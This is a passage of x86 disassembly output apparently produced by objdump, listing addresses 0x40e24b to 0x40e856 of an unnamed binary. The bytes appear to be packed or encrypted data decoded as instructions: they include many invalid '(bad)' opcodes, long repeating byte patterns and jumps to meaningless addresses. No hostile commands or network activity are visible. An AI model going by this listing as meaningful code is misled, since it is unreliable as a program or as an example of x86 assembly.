  40e24b:	63 d7                	arpl   %edx,%edi
  40e24d:	31 dc                	xor    %ebx,%esp
  40e24f:	ca 42 63             	lret   $0x6342
  40e252:	85 10                	test   %edx,(%eax)
  40e254:	13 97 22 40 6d f0    	adc    -0xf92bfde(%edi),%edx
  40e25a:	ff                   	(bad)
  40e25b:	ff 84 c6 11 20 85 4a 	incl   0x4a852011(%esi,%eax,8)
  40e262:	24 7d                	and    $0x7d,%al
  40e264:	d2 bb 3d f8 ae f9    	sarb   %cl,-0x65107c3(%ebx)
  40e26a:	32 11                	xor    (%ecx),%dl
  40e26c:	c7                   	(bad)
  40e26d:	29 a1 6d d4 2f ff    	sub    %esp,-0xd02b93(%ecx)
  40e273:	ff                   	(bad)
  40e274:	ff 4b 1f             	decl   0x1f(%ebx)
  40e277:	b2 30                	mov    $0x30,%dl
  40e279:	f3 0d 86 52 ec 77    	repz or $0x77ec5286,%eax
  40e27f:	c1 e3 d0             	shl    $0xd0,%ebx
  40e282:	2b b3 16 6c a9 70    	sub    0x70a96c16(%ebx),%esi
  40e288:	b9 99 11 94 48       	mov    $0x48941199,%ecx
  40e28d:	fa                   	cli
  40e28e:	47                   	inc    %edi
  40e28f:	e9 ff ff ff ff       	jmp    0x40e293
  40e294:	64 22 a8 fc 8c c4 a0 	and    %fs:-0x5f3b7304(%eax),%ch
  40e29b:	f0 3f                	lock aas
  40e29d:	1a 56 7d             	sbb    0x7d(%esi),%dl
  40e2a0:	2c d8                	sub    $0xd8,%al
  40e2a2:	22 33                	and    (%ebx),%dh
  40e2a4:	90                   	nop
  40e2a5:	ef                   	out    %eax,(%dx)
  40e2a6:	87 49 4e             	xchg   %ecx,0x4e(%ecx)
  40e2a9:	c7                   	(bad)
  40e2aa:	d9 38                	fnstcw (%eax)
  40e2ac:	d1 c1                	rol    $1,%ecx
  40e2ae:	8c ca                	mov    %cs,%edx
  40e2b0:	a2 fe 98 d4 ff       	mov    %al,0xffd498fe
  40e2b5:	ff                   	(bad)
  40e2b6:	ff                   	(bad)
  40e2b7:	ff 0b                	decl   (%ebx)
  40e2b9:	36 a6                	cmpsb  %es:(%edi),%ss:(%esi)
  40e2bb:	f5                   	cmc
  40e2bc:	81 cf a5 7a de 28    	or     $0x28de7aa5,%edi
  40e2c2:	da b7 8e 26 3f ad    	fidivl -0x52c0d972(%edi)
  40e2c8:	bf a4 2c 3a 9d       	mov    $0x9d3a2ca4,%edi
  40e2cd:	e4 50                	in     $0x50,%al
  40e2cf:	78 92                	js     0x40e263
  40e2d1:	0d 6a 5f cc 9b       	or     $0x9bcc5f6a,%eax
  40e2d6:	54                   	push   %esp
  40e2d7:	7e ff                	jle    0x40e2d8
  40e2d9:	ff                   	(bad)
  40e2da:	ff                   	(bad)
  40e2db:	ff 46 62             	incl   0x62(%esi)
  40e2de:	f6 8d 13 c2 90 d8 b8 	testb  $0xb8,-0x276f3ded(%ebp)
  40e2e5:	e8 2e 39 f7 5e       	call   0x5f381c18
  40e2ea:	82 c3 af             	add    $0xaf,%bl
  40e2ed:	f5                   	cmc
  40e2ee:	9f                   	lahf
  40e2ef:	5d                   	pop    %ebp
  40e2f0:	80 be 69 d0 93 7c 6f 	cmpb   $0x6f,0x7c93d069(%esi)
  40e2f7:	d5 2d                	aad    $0x2d
  40e2f9:	a9 cf 25 ff 5b       	test   $0x5bff25cf,%eax
  40e2fe:	fd                   	std
  40e2ff:	ff 12                	call   *(%edx)
  40e301:	b3 c8                	mov    $0xc8,%bl
  40e303:	ac                   	lods   %ds:(%esi),%al
  40e304:	99                   	cltd
  40e305:	3b 10                	cmp    (%eax),%edx
  40e307:	18 7d a7             	sbb    %bh,-0x59(%ebp)
  40e30a:	e8 9c 63 6e 5c       	call   0x5caf46ab
  40e30f:	bb 7b cd 26 78       	mov    $0x7826cd7b,%ebx
  40e314:	09 6e 59             	or     %ebp,0x59(%esi)
  40e317:	18 ff                	sbb    %bh,%bh
  40e319:	ff                   	(bad)
  40e31a:	ff                   	(bad)
  40e31b:	ff f4                	push   %esp
  40e31d:	ec                   	in     (%dx),%al
  40e31e:	9a b7 01 83 4f 9a a8 	lcall  $0xa89a,$0x4f8301b7
  40e325:	e6 95                	out    %al,$0x95
  40e327:	6e                   	outsb  %ds:(%esi),(%dx)
  40e328:	65 aa                	gs stos %al,%es:(%edi)
  40e32a:	ff e6                	jmp    *%esi
  40e32c:	7e 21                	jle    0x40e34f
  40e32e:	bc cf 08 ef 15       	mov    $0x15ef08cf,%esp
  40e333:	e8 e6 ba e7 9b       	call   0x9c289e1e
  40e338:	d9 4a 6f             	(bad) 0x6f(%edx)
  40e33b:	36 ff                	ss (bad)
  40e33d:	ff                   	(bad)
  40e33e:	ff                   	(bad)
  40e33f:	ff ce                	dec    %esi
  40e341:	ea 9f 09 d4 29 b0 7c 	ljmp   $0x7cb0,$0x29d4099f
  40e348:	d6                   	salc
  40e349:	31 a4 b2 af 2a 3f 23 	xor    %esp,0x233f2aaf(%edx,%esi,4)
  40e350:	31 c6                	xor    %eax,%esi
  40e352:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40e353:	94                   	xchg   %eax,%esp
  40e354:	30 35 a2 66 c0 74    	xor    %dh,0x74c066a2
  40e35a:	4e                   	dec    %esi
  40e35b:	bc 37 fc 82 ca       	mov    $0xca82fc37,%esp
  40e360:	ff                   	(bad)
  40e361:	ff                   	(bad)
  40e362:	ff                   	(bad)
  40e363:	ff a6 e0 90 d0 b0    	jmp    *-0x4f2f6f20(%esi)
  40e369:	33 a7 d8 15 f1 04    	xor    0x4f115d8(%edi),%esp
  40e36f:	98                   	cwtl
  40e370:	4a                   	dec    %edx
  40e371:	41                   	inc    %ecx
  40e372:	ec                   	in     (%dx),%al
  40e373:	da f7                	(bad)
  40e375:	7f cd                	jg     0x40e344
  40e377:	50                   	push   %eax
  40e378:	0e                   	push   %cs
  40e379:	17                   	pop    %ss
  40e37a:	91                   	xchg   %eax,%ecx
  40e37b:	f6 2f                	imulb  (%edi)
  40e37d:	76 4d                	jbe    0x40e3cc
  40e37f:	d6                   	salc
  40e380:	8d 43 ef             	lea    -0x11(%ebx),%eax
  40e383:	b0 ff                	mov    $0xff,%al
  40e385:	ff                   	(bad)
  40e386:	ff                   	(bad)
  40e387:	ff 4d cc             	decl   -0x34(%ebp)
  40e38a:	aa                   	stos   %al,%es:(%edi)
  40e38b:	4d                   	dec    %ebp
  40e38c:	54                   	push   %esp
  40e38d:	e4 96                	in     $0x96,%al
  40e38f:	04 df                	add    $0xdf,%al
  40e391:	9e                   	sahf
  40e392:	d1 b5 e3 4c 6a 88    	shll   $1,-0x7795b31d(%ebp)
  40e398:	1b c1                	sbb    %ecx,%eax
  40e39a:	2c 1f                	sub    $0x1f,%al
  40e39c:	b8 46 65 51 7f       	mov    $0x7f516546,%eax
  40e3a1:	9d                   	popf
  40e3a2:	5e                   	pop    %esi
  40e3a3:	ea 04 01 8c 35 ff ff 	ljmp   $0xffff,$0x358c0104
  40e3aa:	ff                   	(bad)
  40e3ab:	ff 5d fa             	lcall  *-0x6(%ebp)
  40e3ae:	87 74 73 fb          	xchg   %esi,-0x5(%ebx,%esi,2)
  40e3b2:	0b 41 2e             	or     0x2e(%ecx),%eax
  40e3b5:	b3 67                	mov    $0x67,%bl
  40e3b7:	1d 5a 92 db d2       	sbb    $0xd2db925a,%eax
  40e3bc:	52                   	push   %edx
  40e3bd:	e9 10 56 33 6d       	jmp    0x6d7439d2
  40e3c2:	d6                   	salc
  40e3c3:	47                   	inc    %edi
  40e3c4:	13 9a d7 61 8c 37    	adc    0x378c61d7(%edx),%ebx
  40e3ca:	a1 0c ff ff ff       	mov    0xffffff0c,%eax
  40e3cf:	ff                   	(bad)
  40e3d0:	7a 59                	jp     0x40e42b
  40e3d2:	f8                   	clc
  40e3d3:	14 8e                	adc    $0x8e,%al
  40e3d5:	eb 13                	jmp    0x40e3ea
  40e3d7:	3c 89                	cmp    $0x89,%al
  40e3d9:	ce                   	into
  40e3da:	a9 27 ee b7 61       	test   $0x61b7ee27,%eax
  40e3df:	c9                   	leave
  40e3e0:	35 e1 1c e5 ed       	xor    $0xede51ce1,%eax
  40e3e5:	7a 47                	jp     0x40e42e
  40e3e7:	b1 3c                	mov    $0x3c,%cl
  40e3e9:	9c                   	pushf
  40e3ea:	d2 df                	rcr    %cl,%bh
  40e3ec:	59                   	pop    %ecx
  40e3ed:	55                   	push   %ebp
  40e3ee:	f2 73 ff             	bnd jae 0x40e3f0
  40e3f1:	ff                   	(bad)
  40e3f2:	ff                   	(bad)
  40e3f3:	ff                   	(bad)
  40e3f4:	3f                   	aas
  40e3f5:	18 14 ce             	sbb    %dl,(%esi,%ecx,8)
  40e3f8:	79 73                	jns    0x40e46d
  40e3fa:	c7                   	(bad)
  40e3fb:	37                   	aaa
  40e3fc:	bf 53 f7 cd ea       	mov    $0xeacdf753,%edi
  40e401:	5f                   	pop    %edi
  40e402:	fd                   	std
  40e403:	aa                   	stos   %al,%es:(%edi)
  40e404:	5b                   	pop    %ebx
  40e405:	df 3d 6f 14 78 44    	fistpll 0x4478146f
  40e40b:	db 86 ca af f3 81    	fildl  -0x7e0c5036(%esi)
  40e411:	b9 68 c4 ff ff       	mov    $0xffffc468,%ecx
  40e416:	1b fd                	sbb    %ebp,%edi
  40e418:	3e 38 24 34          	cmp    %ah,%ds:(%esp,%esi,1)
  40e41c:	2c c2                	sub    $0xc2,%al
  40e41e:	05 5f 16 1d c3       	add    $0xc31d165f,%eax
  40e423:	72 bc                	jb     0x40e3e1
  40e425:	e2 25                	loop   0x40e44c
  40e427:	0c 28                	or     $0x28,%al
  40e429:	3c 49                	cmp    $0x49,%al
  40e42b:	8b ff                	mov    %edi,%edi
  40e42d:	0d 95 41 97 fe       	or     $0xfe974195,%eax
  40e432:	ff                   	(bad)
  40e433:	ff                   	(bad)
  40e434:	39 a8 01 71 08 0c    	cmp    %ebp,0xc087101(%eax)
  40e43a:	b3 de                	mov    $0xde,%bl
  40e43c:	d8 b4 e4 9c 64 56 c1 	fdivs  -0x3ea99b64(%esp,%eiz,8)
  40e443:	90                   	nop
  40e444:	7b cb                	jnp    0x40e411
  40e446:	84 61 d5             	test   %ah,-0x2b(%ecx)
  40e449:	32 b6 36 6c 5c 4d    	xor    0x4d5c6c36(%esi),%dh
  40e44f:	d3 74 fd 74          	shll   %cl,0x74(%ebp,%edi,8)
  40e453:	d0 b8 57 42 50 00    	sarb   $1,0x504257(%eax)
  40e459:	53                   	push   %ebx
  40e45a:	c3                   	ret
  40e45b:	96                   	xchg   %eax,%esi
  40e45c:	cb                   	lret
  40e45d:	34 4d                	xor    $0x4d,%al
  40e45f:	d3 34 f1             	shll   %cl,(%ecx,%esi,8)
  40e462:	ab                   	stos   %eax,%es:(%edi)
  40e463:	93                   	xchg   %eax,%ebx
  40e464:	55                   	push   %ebp
  40e465:	f6 d3                	not    %bl
  40e467:	34 4d                	xor    $0x4d,%al
  40e469:	d3 91 25 fc d7 80    	rcll   %cl,-0x7f2803db(%ecx)
  40e46f:	4d                   	dec    %ebp
  40e470:	d3 34 4d 8f 49 67 98 	shll   %cl,-0x6798b671(,%ecx,2)
  40e477:	e1 02                	loope  0x40e47b
  40e479:	34 4d                	xor    $0x4d,%al
  40e47b:	d3 34 12             	shll   %cl,(%edx,%edx,1)
  40e47e:	a3 c6 e7 95 d3       	mov    %eax,0xd395e7c6
  40e483:	34 4d                	xor    $0x4d,%al
  40e485:	d3 eb                	shr    %cl,%ebx
  40e487:	da 2d d3 29 4d d3    	fisubrl 0xd34d29d3
  40e48d:	34 4d                	xor    $0x4d,%al
  40e48f:	44                   	inc    %esp
  40e490:	6a 78                	push   $0x78
  40e492:	6b dd b6             	imul   $0xffffffb6,%ebp,%ebx
  40e495:	34 4d                	xor    $0x4d,%al
  40e497:	d3 34 17             	shll   %cl,(%edi,%edx,1)
  40e49a:	66 b4 18             	data16 mov $0x18,%ah
  40e49d:	82 d3 34             	adc    $0x34,%bl
  40e4a0:	4d                   	dec    %ebp
  40e4a1:	d3 60 45             	shll   %cl,0x45(%eax)
  40e4a4:	e0 84                	loopne 0x40e42a
  40e4a6:	1c 4d                	sbb    $0x4d,%al
  40e4a8:	d3 34 4d 94 58 19 87 	shll   %cl,-0x78e6a76c(,%ecx,2)
  40e4af:	b7 23                	mov    $0x23,%bh
  40e4b1:	34 4d                	xor    $0x4d,%al
  40e4b3:	d3 34 e2             	shll   %cl,(%edx,%eiz,8)
  40e4b6:	57                   	push   %edi
  40e4b7:	2a 07                	sub    (%edi),%al
  40e4b9:	03 d3                	add    %ebx,%edx
  40e4bb:	34 4d                	xor    $0x4d,%al
  40e4bd:	d3 9a a5 f2 b2 ba    	rcrl   %cl,-0x454d0d5b(%edx)
  40e4c3:	4d                   	dec    %ebp
  40e4c4:	d3 34 4d 5c 2b 92 f0 	shll   %cl,-0xf6dd4a4(,%ecx,2)
  40e4cb:	a1 cd 34 4d d3       	mov    0xd34d34cd,%eax
  40e4d0:	34 d5                	xor    $0xd5,%al
  40e4d2:	1f                   	pop    %ds
  40e4d3:	8a 9d a0 d3 34 4d    	mov    0x4d34d3a0(%ebp),%bl
  40e4d9:	d3 32                	shll   %cl,(%edx)
  40e4db:	75 39                	jne    0x40e516
  40e4dd:	aa                   	stos   %al,%es:(%edi)
  40e4de:	06                   	push   %es
  40e4df:	4d                   	dec    %ebp
  40e4e0:	d3 34 4d 51 f9 3d ae 	shll   %cl,-0x51c206af(,%ecx,2)
  40e4e7:	46                   	inc    %esi
  40e4e8:	b5 34                	mov    $0x34,%ch
  40e4ea:	4d                   	dec    %ebp
  40e4eb:	d3 34 05 6f ff 24 97 	shll   %cl,-0x68db0091(,%eax,1)
  40e4f2:	d3 34 4d d3 cc 77 bd 	shll   %cl,-0x4288332d(,%ecx,2)
  40e4f9:	88 38                	mov    %bh,(%eax)
  40e4fb:	4d                   	dec    %ebp
  40e4fc:	d3 34 4d db 47 e9 c9 	shll   %cl,-0x3616b825(,%ecx,2)
  40e503:	00 83 34 4d d3 34    	add    %al,0x34d34d34(%ebx)
  40e509:	48                   	dec    %eax
  40e50a:	ac                   	lods   %ds:(%esi),%al
  40e50b:	4e                   	dec    %esi
  40e50c:	fb                   	sti
  40e50d:	56                   	push   %esi
  40e50e:	d3 34 4d d3 1e 27 64 	shll   %cl,0x64271ed3(,%ecx,2)
  40e515:	21 d1                	and    %edx,%ecx
  40e517:	4d                   	dec    %ebp
  40e518:	d3 34 4d 3a b1 0f d2 	shll   %cl,-0x2df04ec6(,%ecx,2)
  40e51f:	9e                   	sahf
  40e520:	4f                   	dec    %edi
  40e521:	34 4d                	xor    $0x4d,%al
  40e523:	d3 34 a2             	shll   %cl,(%edx,%eiz,4)
  40e526:	69 16 0a e5 d3 34    	imul   $0x34d3e50a,(%esi),%edx
  40e52c:	4d                   	dec    %ebp
  40e52d:	d3 43 1d             	roll   %cl,0x1d(%ebx)
  40e530:	0b ad b9 4d d3 34    	or     0x34d34db9(%ebp),%ebp
  40e536:	4d                   	dec    %ebp
  40e537:	c8 85 4c bb          	enter  $0x4c85,$0xbb
  40e53b:	fd                   	std
  40e53c:	9f                   	lahf
  40e53d:	34 4d                	xor    $0x4d,%al
  40e53f:	d3 34 bc             	shll   %cl,(%esp,%edi,4)
  40e542:	c5 34 76             	lds    (%esi,%esi,2),%esi
  40e545:	dc d3                	(bad)
  40e547:	34 4d                	xor    $0x4d,%al
  40e549:	d3 68 63             	shrl   %cl,0x63(%eax)
  40e54c:	ca 10 40             	lret   $0x4010
  40e54f:	4d                   	dec    %ebp
  40e550:	d3 34 4d 20 7d f8 11 	shll   %cl,0x11f87d20(,%ecx,2)
  40e557:	6d                   	insl   (%dx),%es:(%edi)
  40e558:	4b                   	dec    %ebx
  40e559:	34 4d                	xor    $0x4d,%al
  40e55b:	d3 34 f3             	shll   %cl,(%ebx,%esi,8)
  40e55e:	ec                   	in     (%dx),%al
  40e55f:	d0 6c 99 d3          	shrb   $1,-0x2d(%ecx,%ebx,4)
  40e563:	34 4d                	xor    $0x4d,%al
  40e565:	d3 fa                	sar    %cl,%edx
  40e567:	22 c4                	and    %ah,%al
  40e569:	1a d8                	sbb    %al,%bl
  40e56b:	4d                   	dec    %ebp
  40e56c:	d3 34 4d ef c7 c1 fe 	shll   %cl,-0x13e3811(,%ecx,2)
  40e573:	36 cf                	ss iret
  40e575:	34 4d                	xor    $0x4d,%al
  40e577:	d3 34 28             	shll   %cl,(%eax,%ebp,1)
  40e57a:	26 a4                	movsb  %es:(%esi),%es:(%edi)
  40e57c:	e4 0d                	in     $0xd,%al
  40e57e:	d3 34 4d d3 9b 62 c2 	shll   %cl,-0x3d9d642d(,%ecx,2)
  40e585:	e8 5e 4d d3 34       	call   0x351432e8
  40e58a:	4d                   	dec    %ebp
  40e58b:	f5                   	cmc
  40e58c:	be 7c a9 b3 3b       	mov    $0x3bb3a97c,%esi
  40e591:	34 4d                	xor    $0x4d,%al
  40e593:	d3 34 a7             	shll   %cl,(%edi,%eiz,4)
  40e596:	6e                   	outsb  %ds:(%esi),(%dx)
  40e597:	7b 09                	jnp    0x40e5a2
  40e599:	f4                   	hlt
  40e59a:	d3 34 4d d3 01 a8 65 	shll   %cl,0x65a801d3(,%ecx,2)
  40e5a1:	7e 08                	jle    0x40e5ab
  40e5a3:	4d                   	dec    %ebp
  40e5a4:	d3 34 4d e6 d9 ce d4 	shll   %cl,-0x2b31261a(,%ecx,2)
  40e5ab:	d6                   	salc
  40e5ac:	af                   	scas   %es:(%edi),%eax
  40e5ad:	34 4d                	xor    $0x4d,%al
  40e5af:	d3 34 31             	shll   %cl,(%ecx,%esi,1)
  40e5b2:	30 c0                	xor    %al,%al
  40e5b4:	37                   	aaa
  40e5b5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e5b6:	d3 34 4d d3 b0 15 4a 	shll   %cl,0x4a15b0d3(,%ecx,2)
  40e5bd:	f7 0e 4d d3 34 4d    	testl  $0x4d34d34d,(%esi)
  40e5c3:	2f                   	das
  40e5c4:	8d 4d 54             	lea    0x54(%ebp),%ecx
  40e5c7:	df e3                	(bad)
  40e5c9:	34 4d                	xor    $0x4d,%al
  40e5cb:	d3 34 1b             	shll   %cl,(%ebx,%ebx,1)
  40e5ce:	b8 7f 04 5d d3       	mov    $0xd35d047f,%eax
  40e5d3:	34 4d                	xor    $0x4d,%al
  40e5d5:	d3 73 2e             	shll   %cl,0x2e(%ebx)
  40e5d8:	5a                   	pop    %edx
  40e5d9:	52                   	push   %edx
  40e5da:	33 4d d3             	xor    -0x2d(%ebp),%ecx
  40e5dd:	34 4d                	xor    $0x4d,%al
  40e5df:	13 8c 7a 8e 89 ee 34 	adc    0x34ee898e(%edx,%edi,2),%ecx
  40e5e6:	4d                   	dec    %ebp
  40e5e7:	d3 34 35 ed 3c 59 3f 	shll   %cl,0x3f593ced(,%esi,1)
  40e5ee:	d3 34 4d d3 79 bf ea 	shll   %cl,-0x1540862d(,%ecx,2)
  40e5f5:	5b                   	pop    %ebx
  40e5f6:	14 4d                	adc    $0x4d,%al
  40e5f8:	d3 34 4d 86 81 3e 2c 	shll   %cl,0x2c3e8186(,%ecx,2)
  40e5ff:	5f                   	pop    %edi
  40e600:	72 34                	jb     0x40e636
  40e602:	4d                   	dec    %ebp
  40e603:	d3 34 0c             	shll   %cl,(%esp,%ecx,1)
  40e606:	8b 41 71             	mov    0x71(%ecx),%eax
  40e609:	de d3                	(bad)
  40e60b:	34 4d                	xor    $0x4d,%al
  40e60d:	d3 9c 90 61 70 74 4d 	rcrl   %cl,0x4d747061(%eax,%edx,4)
  40e614:	d3 34 4d 42 a7 65 a4 	shll   %cl,-0x5b9a58be(,%ecx,2)
  40e61b:	5e                   	pop    %esi
  40e61c:	6b 34 4d d3 34 45 58 	imul   $0x3,0x584534d3(,%ecx,2),%esi
  40e623:	03 
  40e624:	fa                   	cli
  40e625:	6d                   	insl   (%dx),%es:(%edi)
  40e626:	d3 34 4d d3 76 4c d7 	shll   %cl,-0x28b3892d(,%ecx,2)
  40e62d:	cb                   	lret
  40e62e:	44                   	inc    %esp
  40e62f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e630:	b9 34 4d a3 5a       	mov    $0x5aa34d34,%ecx
  40e635:	1b ba 0e c0 9a a6    	sbb    -0x59653ff2(%edx),%edi
  40e63b:	69 9a 75 f0 97 f9 5f 	imul   $0x9a699c5f,-0x6680f8b(%edx),%ebx
  40e642:	9c 69 9a 
  40e645:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e646:	69 7a 59 83 21 69 a6 	imul   $0xa6692183,0x59(%edx),%edi
  40e64d:	69 9a a6 c8 89 79 3e 	imul   $0xa69a713e,0x7989c8a6(%edx),%ebx
  40e654:	71 9a a6 
  40e657:	69 9a 4f ad ac 3a 4a 	imul   $0x9a69314a,0x3aacad4f(%edx),%ebx
  40e65e:	31 69 9a 
  40e661:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e662:	69 33 7f 77 ae a0    	imul   $0xa0ae777f,(%ebx),%esi
  40e668:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e669:	69 9a a6 2b 68 fd 6c 	imul   $0xa69af86c,-0x297d45a(%edx),%ebx
  40e670:	f8 9a a6 
  40e673:	69 9a d3 02 8f ab 28 	imul   $0x9a69c228,-0x5470fd2d(%edx),%ebx
  40e67a:	c2 69 9a 
  40e67d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e67e:	69 7b 08 87 a5 6a a6 	imul   $0xa66aa587,0x8(%ebx),%edi
  40e685:	69 9a a6 82 1c b4 f2 	imul   $0xa69ae2f2,-0x4be37d5a(%edx),%ebx
  40e68c:	e2 9a a6 
  40e68f:	69 9a f4 be 62 fe 53 	imul   $0x9a695553,-0x19d410c(%edx),%ebx
  40e696:	55 69 9a 
  40e699:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e69a:	69 e1 eb ec ef 9f    	imul   $0x9fefeceb,%ecx,%esp
  40e6a0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e6a1:	69 9a a6 10 8a 06 05 	imul   $0xa69abd05,0x68a10a6(%edx),%ebx
  40e6a8:	bd 9a a6 
  40e6ab:	69 9a 8d 5d d4 15 fb 	imul   $0x9a69e9fb,0x15d45d8d(%edx),%ebx
  40e6b2:	e9 69 9a 
  40e6b5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e6b6:	69 43 9e 42 8b 5b a6 	imul   $0xa65b8b42,-0x62(%ebx),%eax
  40e6bd:	69 9a a6 ee 0a 0f 1e 	imul   $0xa69a001e,0xf0aeea6(%edx),%ebx
  40e6c4:	00 9a a6 
  40e6c7:	69 9a 86 ed 70 72 ff 	imul   $0x9a6938ff,0x7270ed86(%edx),%ebx
  40e6ce:	38 69 9a 
  40e6d1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e6d2:	69 d5 39 d9 a6 54    	imul   $0x54a6d939,%ebp,%edx
  40e6d8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e6d9:	69 9a a6 2e 67 e7 96 	imul   $0xa69a9196,-0x1898d15a(%edx),%ebx
  40e6e0:	91 9a a6 
  40e6e3:	69 9a c5 20 4b 1a ba 	imul   $0x9a692aba,0x1a4b20c5(%edx),%ebx
  40e6ea:	2a 69 9a 
  40e6ed:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e6ee:	69 e0 17 0d c7 a8    	imul   $0xa8c70d17,%eax,%esp
  40e6f4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e6f5:	69 9a a6 a9 19 07 dd 	imul   $0xa69a60dd,0x719a9a6(%edx),%ebx
  40e6fc:	60 9a a6 
  40e6ff:	69 9a 26 f5 3b 7e 29 	imul   $0x9a69c629,0x7e3bf526(%edx),%ebx
  40e706:	c6 69 9a 
  40e709:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e70a:	69 fc f1 dc 85 22    	imul   $0x2285dcf1,%esp,%edi
  40e710:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e711:	69 9a a6 11 24 3d 32 	imul   $0xa69aa132,0x3d2411a6(%edx),%ebx
  40e718:	a1 9a a6 
  40e71b:	69 9a 2f 30 52 e3 16 	imul   $0x9a69b916,-0x1cadcfd1(%edx),%ebx
  40e722:	b9 69 9a 
  40e725:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e726:	69 48 64 8c 3f 2c a6 	imul   $0xa62c3f8c,0x64(%eax),%ecx
  40e72d:	69 9a a6 90 4e d1 a2 	imul   $0xa69a0ba2,-0x2eb16f5a(%edx),%ebx
  40e734:	0b 9a a6 
  40e737:	69 9a 81 de 8e bf 9d 	imul   $0x9a69929d,-0x4071217f(%edx),%ebx
  40e73e:	92 69 9a 
  40e741:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e742:	69 cc 46 13 b8 f7    	imul   $0xf7b81346,%esp,%ecx
  40e748:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e749:	69 9a a6 af 80 93 2d 	imul   $0xa69a122d,-0x6c7f505a(%edx),%ebx
  40e750:	12 9a a6 
  40e753:	69 9a 99 7d 63 bb 78 	imul   $0x9a691878,-0x449c8267(%edx),%ebx
  40e75a:	18 69 9a 
  40e75d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e75e:	69 b7 9a 6e e6 cf a6 	imul   $0xa69a69a6,-0x30199166(%edi),%esi
  40e765:	69 9a a6 
  40e768:	e8 9b 36 09 7c       	call   0x7c4a1e08
  40e76d:	9a a6 69 9a b2 23 94 	lcall  $0x9423,$0xb29a69a6
  40e774:	66 bc ca 69          	mov    $0x69ca,%sp
  40e778:	9a a6 69 d0 d8 98 da 	lcall  $0xda98,$0xd8d069a6
  40e77f:	50                   	push   %eax
  40e780:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e781:	69 9a a6 f6 d6 b0 4d 	imul   $0xa69a044d,-0x4f29095a(%edx),%ebx
  40e788:	04 9a a6 
  40e78b:	69 9a b5 88 1f 51 ea 	imul   $0x9a6935ea,0x511f88b5(%edx),%ebx
  40e792:	35 69 9a 
  40e795:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e796:	69 74 41 1d d2 56 a6 	imul   $0x69a656d2,0x1d(%ecx,%eax,2),%esi
  40e79d:	69 
  40e79e:	9a a6 47 61 0c 14 3c 	lcall  $0x3c14,$0xc6147a6
  40e7a5:	9a a6 69 9a 27 c9 e5 	lcall  $0xe5c9,$0x279a69a6
  40e7ac:	b1 df                	mov    $0xdf,%cl
  40e7ae:	73 69                	jae    0x40e819
  40e7b0:	9a a6 69 ce 37 cd aa 	lcall  $0xaacd,$0x37ce69a6
  40e7b7:	6f                   	outsl  %ds:(%esi),(%dx)
  40e7b8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e7b9:	69 9a a6 db f3 c4 34 	imul   $0xa69a4034,-0x3b0c245a(%edx),%ebx
  40e7c0:	40 9a a6 
  40e7c3:	69 9a c3 25 49 95 01 	imul   $0x9a69b301,-0x6ab6da3d(%edx),%ebx
  40e7ca:	b3 69 9a 
  40e7cd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e7ce:	69 e4 c1 84 b6 5c    	imul   $0x5cb684c1,%esp,%esp
  40e7d4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e7d5:	69 9a a6 57 f4 41 17 	imul   $0xa69a2717,0x41f457a6(%edx),%ebx
  40e7dc:	27 9a a6 
  40e7df:	69 9a ab 9d fa e3 30 	imul   $0x9a697630,-0x1c056255(%edx),%ebx
  40e7e6:	76 69 9a 
  40e7e9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e7ea:	69 cc 02 e5 2a 35    	imul   $0x352ae502,%esp,%ecx
  40e7f0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e7f1:	69 9a a6 62 b1 ba ea 	imul   $0xa69afeea,-0x454e9d5a(%edx),%ebx
  40e7f8:	fe 9a a6 
  40e7fb:	69 9a 2f 4c 46 d3 8f 	imul   $0x9a69928f,-0x2cb9b3d1(%edx),%ebx
  40e802:	92 69 9a 
  40e805:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e806:	69 6d 52 be 74 e0 a6 	imul   $0xa6e074be,0x52(%ebp),%ebp
  40e80d:	69 9a a6 c9 c2 8e 58 	imul   $0xa69ab958,-0x713d365a(%edx),%ebx
  40e814:	b9 9a a6 
  40e817:	69 9a e1 88 20 ce df 	imul   $0x9a691adf,-0x31df771f(%edx),%ebx
  40e81e:	1a 69 9a 
  40e821:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e822:	69 51 53 64 6b 81 a6 	imul   $0xa6816b64,0x53(%ecx),%edx
  40e829:	69 9a a6 08 48 45 de 	imul   $0xa69a7bde,0x454808a6(%edx),%ebx
  40e830:	7b 9a a6 
  40e833:	69 9a 73 4b 1f 55 eb 	imul   $0x9a69b5eb,0x551f4b73(%edx),%ebx
  40e83a:	b5 69 9a 
  40e83d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e83e:	69 c5 37 28 bf 03    	imul   $0x3bf2837,%ebp,%eax
  40e844:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e845:	69 9a a6 16 cf 79 07 	imul   $0xa69a6907,0x79cf16a6(%edx),%ebx
  40e84c:	69 9a a6 
  40e84f:	69 9a da 05 34 a6 2e 	imul   $0x9a69f32e,-0x59cbfa26(%edx),%ebx
  40e856:	f3 69 9a 
